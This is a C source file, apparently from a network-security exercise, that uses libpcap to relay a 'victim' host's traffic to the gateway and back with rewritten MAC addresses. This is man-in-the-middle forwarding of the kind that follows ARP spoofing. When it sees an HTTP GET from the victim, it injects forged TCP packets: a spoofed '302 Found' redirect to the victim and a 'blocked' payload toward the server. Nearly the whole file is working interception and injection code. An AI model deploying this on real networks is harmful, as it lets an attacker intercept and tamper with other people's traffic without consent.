#include "myHeader.h"

int checkHttp(const u_char* packet) {
	struct libnet_ethernet_hdr* eth;
	struct libnet_ipv4_hdr* ip;
	struct libnet_tcp_hdr* tcp;
	/* ethernet header */
	eth = (struct libnet_ethernet_hdr*)packet;
	/* ip header */
	if (ntohs(eth->ether_type) != ETHERTYPE_IP) return 0;
	ip = (struct libnet_ipv4_hdr*)(packet + 14);
	/* tcp header */
	if (ntohs(ip->ip_len) <= 20 + 20 || ip->ip_p != IPPRO_TCP) return 0;
	tcp = (struct libnet_tcp_hdr*)(packet + 34);
	/* tcp data */
	const char* cp = (char*)(packet + 54);
	if (memcmp(cp, "GET", 3)) return 0;
	return 1;
}


int packetRedirect(pcap_t* handle, struct pcap_pkthdr* pktHeader, const u_char* packet, PLANINFO LanInfo)
{
	PTCPHEADER header;
	header = (PTCPHEADER)packet;
	u_short ether_type = ntohs(header->ethernet.ether_Type);
	/* ipv4 : 0x0800 */
	if (ether_type == 0x0800)
	{
		if (checkVictim(&header->ethernet, LanInfo))
		{
			if (checkHttp(packet))
			{
				u_char sendPacket[1024] = { 0 };
				const char msgForward[8] = "blocked";
				const char msgBackward[128] = "HTTP/1.1 302 Found\r\nLocation: http://en.wikipedia.org/wiki/HTTP_302\r\n";
				u_short msgForwardLen = strlen(msgForward);
				u_short msgBackwardLen = strlen(msgBackward);
				packet_handlerBackward(sendPacket, packet, msgBackward, msgBackwardLen, LanInfo);
				pcap_sendpacket(handle, sendPacket, 14 + 20 + 20 + msgBackwardLen);
				packet_handlerRedirect(sendPacket, packet, msgForward, msgForwardLen);
				pcap_sendpacket(handle, sendPacket, 14 + 20 + 20 + msgForwardLen);
			}
			else
			{
				/* send to router */
				memcpy(header->ethernet.dst_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
				memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
				memcpy((char*)packet, header, pktHeader->len);
				if (pcap_sendpacket(handle, packet, pktHeader->len /* size */) != 0)
				{
					fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
					return 0;
				}
			}
		}
		else if (checkGateWay(&header->ethernet, LanInfo))
		{
			/* send to victim */
			memcpy(header->ethernet.dst_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
			memcpy(header->ethernet.src_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
			memcpy((char *)packet, header, pktHeader->len);
			if (pcap_sendpacket(handle, packet, pktHeader->len /* size */) != 0)
			{
				fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(handle));
				return 0;
			}
		}
		else
			return 0;
	}
	return 0;
}